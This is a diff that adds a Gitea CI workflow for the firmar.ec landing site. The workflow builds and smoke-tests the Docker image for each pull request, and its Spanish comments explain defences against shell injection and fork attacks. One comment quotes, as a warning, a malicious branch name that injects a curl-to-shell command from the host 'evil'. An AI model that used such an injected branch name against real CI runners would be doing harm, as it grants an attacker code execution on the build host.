@@ -1,0 +1,262 @@
+# Gate de CI sobre PULL REQUESTS — firmar.ec (landing Astro, monorepo pnpm)
+#
+# POR QUÉ EXISTE ESTE ARCHIVO
+# `deploy.yml` solo dispara con `push: [main]` y `workflow_dispatch`. Consecuencia:
+# el head sha de un PR NUNCA recibía un commit status, así que el motor de SEO
+# (idkpublicitaria → `getPullCiStatus`) leía el estado combinado como `"none"` y
+# su gate de auto-merge lo trataba como `ci_red` (fail-closed, correcto). Sin
+# este workflow, activar auto-merge para este conector sería inocuo pero INÚTIL:
+# jamás fusionaría nada. Este job es la precondición #1.
+#
+# Mismo patrón ya construido y verificado en producción para idkmanager-web
+# (`idkmanager-web/.gitea/workflows/pr-check.yml`, runner `prod-deploy`) —
+# aquí adaptado al runner/Dockerfile/puerto propios de este repo.
+#
+# QUÉ CERTIFICA (y por qué eso y no menos)
+# Construye la imagen REAL con el contenido del PR (mismo Dockerfile que
+# `deploy.yml`: `infra/docker/landing.Dockerfile`) y la arranca. Un check que se
+# limitara a `jq .` sobre el seam (`seo-meta.json`) sería un verde que no prueba
+# lo que importa: lo que puede romper producción es que el sitio no COMPILE o no
+# SIRVA con el seam nuevo, no que el JSON parsee. NO pushea al registry, NO toca
+# ningún stack y NO mueve ningún tag en uso.
+#
+# ⚠️ NUNCA interpolar `${{ ... }}` de PAYLOAD dentro de un `run:`.
+# Gitea sustituye esas expresiones como TEXTO CRUDO antes de que bash parsee, así
+# que el valor se ejecuta como código. `head.ref` lo elige quien abre el PR y
+# `git check-ref-format` permite `"`, `;`, `$`, `(`, `)` y backtick en un nombre
+# de rama: una rama llamada `x";curl$IFS-s$IFS http://evil|sh;#` se ejecutaría en
+# la línea de la asignación, ANTES de cualquier guarda. El runner de este repo es
+# host-mode con el socket docker del manager Swarm — eso es root efectivo en
+# IAS01. Todo valor del evento entra por `env:` y se usa entrecomillado
+# (`"$VAR"`), que sí pasa por el entorno del proceso y nunca por el parser del
+# shell. Invariante verificable: ningún `step.run` de este archivo contiene la
+# subcadena literal `${{`.
+#
+# ⚠️ Este workflow y `deploy.yml` COMPARTEN `$GITHUB_WORKSPACE` (host-mode: el
+# workspace se deriva del repo, no del run) y ambos lo vacían con `find -delete`.
+# Sus grupos de `concurrency` son disjuntos a propósito —un check de PR no debe
+# cancelar un deploy ni al revés— así que depende de que el runner del label
+# `firmarec-prod` ejecute un job a la vez (misma restricción documentada en
+# idkmanager-web: `capacity: 1` en el runner es LOAD-BEARING, no una cuota).
+#
+# Requiere el mismo runner que deploy: act_runner host-mode, label
+# `firmarec-prod`, con git + docker en el PATH. Cero secretos nuevos (solo el
+# token efímero de job).
+
+name: pr-check
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+concurrency:
+  # Un PR a la vez. Aquí SÍ se cancela el run en vuelo: si llegó un push nuevo,
+  # certificar el sha viejo no sirve para nada (el gate lee el head ACTUAL).
+  group: pr-check-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+jobs:
+  check:
+    runs-on: firmarec-prod
+    # El runner se comparte con el pipeline de deploy a producción: un build
+    # colgado sin cota lo bloquearía durante horas.
+    timeout-minutes: 25
+
+    env:
+      HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+      HEAD_REF: ${{ github.event.pull_request.head.ref }}
+      HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+      THIS_REPO: ${{ github.repository }}
+      PR_NUMBER: ${{ github.event.pull_request.number }}
+      GITEA_TOKEN: ${{ secrets.GITEA_TOKEN }}
+      REGISTRY: 190.160.10.129:5000
+
+    steps:
+      # --- 0. Validar procedencia ANTES de tocar nada ---------------------------
+      - name: Validar procedencia y head sha
+        run: |
+          set -euo pipefail
+
+          # Fork-guard PRIMERO. Este runner es host-mode con acceso al socket
+          # docker del manager: construir el Dockerfile de un PR ajeno sería
+          # ejecución de código arbitrario en IAS01. Solo ramas del PROPIO repo.
+          if [ "$HEAD_REPO" != "$THIS_REPO" ]; then
+            echo "PR desde un repo externo ($HEAD_REPO) — no se construye en este runner" >&2
+            exit 1
+          fi
+
+          # El sha que se certifica es el HEAD del PR, NO `github.sha`: en un
+          # evento `pull_request`, `github.sha` apunta al merge commit efímero,
+          # que no es el sha que `getPullCiStatus` consulta (ese lee
+          # `pulls/{n}` → `head.sha`). Postear el status sobre el sha equivocado
+          # dejaría el PR en `"none"` para siempre con el job en verde.
+          case "$HEAD_SHA" in
+            [0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*) ;;
+            *) echo "head.sha ausente o con forma inesperada: '$HEAD_SHA'" >&2; exit 1 ;;
+          esac
+
+          echo "Certificando $HEAD_SHA (rama $HEAD_REF)"
+
+      # --- 1. Marcar pending ANTES de trabajar ----------------------------------
+      # Si el runner muere a mitad, el status queda `pending` → el gate de
+      # auto-merge espera (y vence por su deadline propio). Nunca queda en
+      # verde ni desaparece.
+      - name: Commit status → pending
+        run: |
+          set -euo pipefail
+          curl -fsS -X POST \
+            -H "Authorization: token $GITEA_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${GITEA_SERVER_URL:-https://git.idkmanager.com}/api/v1/repos/$THIS_REPO/statuses/$HEAD_SHA" \
+            -d '{"state":"pending","context":"ci/pr-check","description":"construyendo la imagen con el contenido del PR"}'
+
+      # --- 2. Checkout EXACTO del head sha --------------------------------------
+      - name: Clonar y posicionarse en el head sha
+        working-directory: ${{ github.workspace }}
+        run: |
+          set -euo pipefail
+          # host-mode: $GITHUB_WORKSPACE ES el cwd. Vaciar contenido, no el dir.
+          find "$GITHUB_WORKSPACE" -mindepth 1 -delete 2>/dev/null || true
+
+          # El token va por cabecera y NO embebido en la URL ni en el argv:
+          # embebido en la URL queda visible en `ps` para cualquier usuario
+          # local del host mientras dura el clone, y persiste en `.git/config`
+          # si el clone falla antes de que lo purguemos (el runner no tiene FS
+          # efímero). Los GIT_CONFIG_* pasan por el ENTORNO del proceso, que no
+          # es legible desde `ps` por otros usuarios.
+          GIT_CONFIG_COUNT=1 \
+          GIT_CONFIG_KEY_0=http.extraHeader \
+          GIT_CONFIG_VALUE_0="Authorization: token $GITEA_TOKEN" \
+            git clone --depth 20 --branch "$HEAD_REF" \
+              "https://${GITEA_SERVER_HOST:-git.idkmanager.com}/$THIS_REPO.git" "$GITHUB_WORKSPACE"
+
+          # `clone --branch` trae la PUNTA de la rama al momento del clone, que
+          # puede haberse movido desde que se disparó el evento. Construir esa
+          # punta y postear success sobre `HEAD_SHA` certificaría código que
+          # NUNCA se construyó. Nos posicionamos en el sha exacto o fallamos.
+          if ! git -C "$GITHUB_WORKSPACE" checkout --quiet "$HEAD_SHA"; then
+            echo "El head sha $HEAD_SHA ya no está en la rama (la rama avanzó) — este run queda obsoleto" >&2
+            exit 1
+          fi
+          echo "HEAD real: $(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"
+
+      # --- 3. Build de la imagen con el contenido del PR (mismo Dockerfile que
+      #        deploy.yml) ------------------------------------------------------
+      - name: docker build (sin push)
+        working-directory: ${{ github.workspace }}
+        run: |
+          set -euo pipefail
+          # Tag local efímero, sin prefijo de registry: es imposible pushearlo
+          # por accidente. Se borra en el paso de limpieza (if: always()).
+          docker build \
+            --build-arg PUBLIC_STORE_URL="https://tienda.firmar.ec" \
+            -f infra/docker/landing.Dockerfile \
+            -t "firma-ec-landing-prcheck:$HEAD_SHA" .
+
+      # --- 4. Smoke efímero: la imagen ARRANCA y SIRVE --------------------------
+      - name: Smoke de la imagen construida
+        run: |
+          set -euo pipefail
+          IMG="firma-ec-landing-prcheck:$HEAD_SHA"
+          CID=$(docker run -d -P "$IMG")
+          # INT/TERM además de EXIT: con `cancel-in-progress: true` la
+          # cancelación a mitad de step es un camino ESPERADO, no excepcional.
+          # Sin ellos el contenedor queda vivo en el host de producción con un
+          # puerto publicado, acumulándose un PR cancelado tras otro.
+          cleanup() { docker rm -f "$CID" >/dev/null 2>&1 || true; }
+          trap cleanup EXIT INT TERM
+
+          # Un único puerto (8080): a diferencia de idkmanager-web, esta imagen
+          # es Caddy sirviendo TODO el sitio ahí — no hay puerto separado de
+          # healthz (ver infra/docker/landing.Dockerfile, EXPOSE 8080 + su
+          # HEALTHCHECK apunta a "/" en ese mismo puerto).
+          PORT=$(docker port "$CID" 8080/tcp | head -n1 | sed -E 's/.*:([0-9]+)$/\1/')
+          if [ -z "$PORT" ]; then
+            echo "No se pudo resolver el puerto mapeado (8080/tcp)" >&2
+            exit 1
+          fi
+
+          OK=0
+          for i in $(seq 1 10); do
+            CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT}/" || echo 000)
+            if [ "$CODE" = "200" ]; then OK=1; break; fi
+            sleep 2
+          done
+          if [ "$OK" -ne 1 ]; then
+            echo "home no respondió 200 en la imagen del PR" >&2
+            docker logs "$CID" || true
+            exit 1
+          fi
+
+          # El home debe servir un <title> CON CONTENIDO. Un seam
+          # `seo-meta.json` malformado o con una ruta inventada rompe el render
+          # de `BaseHead.astro` (o, si el override ganara mal, dejaría el título
+          # vacío) — aquí se ve. curl y no wget: necesitamos el código HTTP en
+          # el mensaje de error.
+          HOME_BODY=$(curl -sS --max-time 15 -w '\n%{http_code}' "http://127.0.0.1:${PORT}/" 2>/dev/null || true)
+          HOME_CODE=$(tail -n1 <<<"$HOME_BODY")
+          HOME_HTML=$(sed '$d' <<<"$HOME_BODY")
+          if [ "$HOME_CODE" != "200" ]; then
+            echo "GET / en la imagen del PR → HTTP ${HOME_CODE:-sin respuesta} (esperado 200)" >&2
+            docker logs "$CID" 2>&1 | tail -20 || true
+            exit 1
+          fi
+          # Con CONTENIDO: `<title></title>` vacío satisface un `grep '<title>'`
+          # y es exactamente el resultado de un seam que rompió el render.
+          TITLE=$(LC_ALL=C grep -oia -- '<title>[^<]*</title>' <<<"$HOME_HTML" | head -1 | sed -E 's#</?[Tt][Ii][Tt][Ll][Ee]>##g' | tr -d '[:space:]')
+          if [ -z "$TITLE" ]; then
+            echo "El home de la imagen del PR no sirve un <title> con contenido — el render de SEO está roto" >&2
+            exit 1
+          fi
+
+          # `llms.txt` servido y NO VACÍO, no un `ls` dentro de la imagen: es
+          # uno de los archivos whitelisteados para el motor de remediación, así
+          # que comprobar que el inodo existe no dice nada sobre si el PR lo
+          # truncó o lo dejó malformado.
+          LLMS=$(curl -sS --max-time 15 -w '\n%{http_code}' "http://127.0.0.1:${PORT}/llms.txt" 2>/dev/null || true)
+          if [ "$(tail -n1 <<<"$LLMS")" != "200" ] || [ "$(sed '$d' <<<"$LLMS" | tr -d '[:space:]' | wc -c)" -lt 32 ]; then
+            echo "llms.txt no se sirve o vino vacío/truncado en la imagen del PR" >&2
+            exit 1
+          fi
+
+          echo "Smoke del PR OK (home 200 + <title> no vacío + llms.txt servido)"
+
+      # --- 5. Limpieza: contenedor primero, luego imagen ------------------------
+      # El `rmi` sobre una imagen con un contenedor vivo solo DES-ETIQUETA: las
+      # capas quedan. Por eso se matan antes los contenedores que la usen — los
+      # que dejó una cancelación, que el trap del step anterior no alcanzó.
+      - name: Borrar contenedores e imagen de check
+        if: always()
+        run: |
+          docker ps -aq --filter "ancestor=firma-ec-landing-prcheck:$HEAD_SHA" \
+            | xargs -r docker rm -f >/dev/null 2>&1 || true
+          docker rmi -f "firma-ec-landing-prcheck:$HEAD_SHA" >/dev/null 2>&1 || true
+
+      # --- 6. Commit status final -----------------------------------------------
+      - name: Commit status → success
+        if: success()
+        run: |
+          set -euo pipefail
+          curl -fsS -X POST \
+            -H "Authorization: token $GITEA_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${GITEA_SERVER_URL:-https://git.idkmanager.com}/api/v1/repos/$THIS_REPO/statuses/$HEAD_SHA" \
+            -d '{"state":"success","context":"ci/pr-check","description":"la imagen construye y sirve home + title + llms.txt"}'
+
+      - name: Commit status → failure
+        if: failure()
+        run: |
+          set -euo pipefail
+          # Si el fallo fue el fork-guard, `HEAD_SHA` puede no ser un sha usable.
+          # En ese caso no hay nada que marcar: se sale en verde para no
+          # enmascarar el rojo real del job (y sin status, el gate lee "none" →
+          # ci_red, que es lo correcto).
+          case "$HEAD_SHA" in
+            [0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*) ;;
+            *) echo "sin head sha usable — no se postea status (el job ya está en rojo)"; exit 0 ;;
+          esac
+          curl -fsS -X POST \
+            -H "Authorization: token $GITEA_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${GITEA_SERVER_URL:-https://git.idkmanager.com}/api/v1/repos/$THIS_REPO/statuses/$HEAD_SHA" \
+            -d '{"state":"failure","context":"ci/pr-check","description":"el PR no construye o la imagen no sirve — revisar logs del job"}'
